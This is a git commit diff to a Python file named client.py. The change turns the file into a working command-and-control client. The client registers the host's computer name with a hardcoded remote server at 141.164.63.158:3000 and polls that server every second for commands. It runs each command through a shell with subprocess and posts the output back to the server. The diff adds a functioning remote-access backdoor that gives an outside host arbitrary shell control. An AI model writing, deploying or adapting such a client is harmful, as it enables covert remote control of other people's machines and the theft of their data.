cda07c0177ceb4334e974ec87955bbf3936c2207
Hajin Chung <harryhajinchung@gmail.com>
2020-12-02 10:02:20 +0900

    Update client.py

--- client.py
+++ client.py
@@ -1,30 +1,61 @@
 import requests
 import json
+import subprocess
 import os
 import time
 
 HOST = "http://141.164.63.158:3000";
 
 def add():
-  name = os.uname()
+  name = os.environ['COMPUTERNAME']
+
   params = { 'name': name }
   requests.get(f"{HOST}/add", params=params)
 
 def fetch():
-  name = os.name()
+  name = os.environ['COMPUTERNAME']
+
   params = { 'name': name }
   r = requests.get(f"{HOST}/fetch", params=params)
+
   cmds = json.loads(r.text)
 
   for cmd in cmds:
-    execute(cmd['type'], data=cmd['cmdData'])
+    execute(cmd)
 
-def execute(type, data=False):
-  print(f"[INFO] Command type {type} executed")
+def execute(command):
+  type = command['type']
+
+  print(f"[INFO] executed {type}")
+  if type == "command":
+    data = command['cmdData']
+    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    out = proc.stdout.read()
+    err = proc.stderr.read()
+    # print(out)
+    out = out.decode("utf-8")
+    err = err.decode("utf-8")
+
+    if out == "": out = err
+
+    data = {
+      'target': command['target'],
+      'type': type,
+      'uid': command['uid'],
+      'res': out,
+    }
+
+    requests.post(f'{HOST}/res', data=data)
 
 def main():
+  add()
   while True:
     time.sleep(1)
+    fetch()
+    # try:
+    #   fetch()
+    # except Exception as e:
+    #   print(e)
 
 
 if __name__ == "__main__":
